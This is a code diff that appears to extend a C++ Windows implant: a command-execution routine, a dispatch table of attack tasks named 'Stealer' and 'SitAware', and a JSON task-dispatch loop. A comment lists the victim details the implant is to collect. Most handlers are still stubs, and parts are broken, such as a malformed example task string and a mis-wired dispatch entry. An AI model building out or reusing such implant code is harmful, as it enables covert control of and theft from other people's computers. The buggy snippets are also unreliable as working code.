@@ -4,7 +4,12 @@
 #include <unordered_map> // want to include standard c++ stl 
 #include <iostream>
 #include <windows.h>
+#include "nlohmann\json.hpp"
 
+using json = nlohmann::json;
+
+void task_do(json task);
+void task_dispatcher(char * body);
 /* main execute function*/
 char * execute(char * program, char *args, char* outfile){
      LPSTR cmdBuffer = (char *)malloc(1000 * sizeof(char));
@@ -51,6 +56,7 @@ char * execute(char * program, char *args, char* outfile){
     CloseHandle( pi.hProcess );
     CloseHandle( pi.hThread );
     free(cmdBuffer);
+    return NULL;
 }
 
 
@@ -62,16 +68,24 @@ void  FileUpload(std::string args){
 void FileDownload(std::string args){}
 
 void SitAware(std::string args){
+    //implant id, computer name, usernmae, GUI, integrity, ip address, session key?, last seen
+    //expected checkin -
+    printf("WHOAMI\n"); 
+
+
 }
 
 void Stealer(std::string args){
-    printf("DOING THIEVERY");
+    printf("DOING THIEVERY\n");
 }
 
 
 /* Dispatch Table Init*/
 using pfunc = void (*)(std::string);
 std::unordered_map<std::string, pfunc > dispatch_table;
+
+//make global results array?
+//
 
 void DispatchTableInit(){
     dispatch_table["SitAware"] = Stealer;
@@ -80,17 +94,44 @@ void DispatchTableInit(){
     dispatch_table["Stealer"] = Stealer;
     }
 
+char ** jsonParse(){
+    const char * ex = "{\"cmd\": \"Stealer\", \"args\": \"\"}";
+    json tasks = json::parse(ex);
+    std::cout << tasks["cmd"];
+    return NULL;
+
+}
 
 /*task functions*/
 //tasks are lists of tasks structured [cmd: , args:, taskid: ]
-void tasks_dispatch(char ** tasks);
+void tasks_dispatch(const char * body){
+    
+    json tasks = json::parse(body); //json array of tasks
+    json tasks_arr = tasks["Tasks"];
+    int numTasks = tasks["NumTasks"];
+    char * comm;
+    char * args;
+    json task;
+    for (int i = 0; i < numTasks; i ++){
+        task = json::parse( tasks_arr[i]);
+        task_do(task);
+        //get results
+    }
+   
+}
+
 //create results arr and return
 
-void task_do(char *task);
+void task_do(json task){
+    std::cout << task["cmd"] << '\n';
+    std::cout << task["args"] << '\n';
+
 //get cmd, args, id
 //choose execute
-// read output from file and return res
 
+// read output from file and add to global res
+
+}
 
 
 void tasking();
@@ -120,11 +161,13 @@ std::string readFile(char * fileName){
 
 int main(int argc, char* argv[]){
 
-    DispatchTableInit();
+    DispatchTableInit(); //create the map of strings to funcrtions
     //example of how to call the right function
     pfunc p = dispatch_table["Stealer"];
     std::string args = "";
-    (*p)(args);
+    //(*p)(args);
+    const char * ex = "{\"Tasks: [  {  \"{\"cmd\": \"Stealer\", \"args\": \"\"}, {  {\"cmd\": \"SitAware\", \"args\": \"\"}}  }   ]\", \"NumTasks\": 2}";
+    tasks_dispatch(ex);
     
 
 
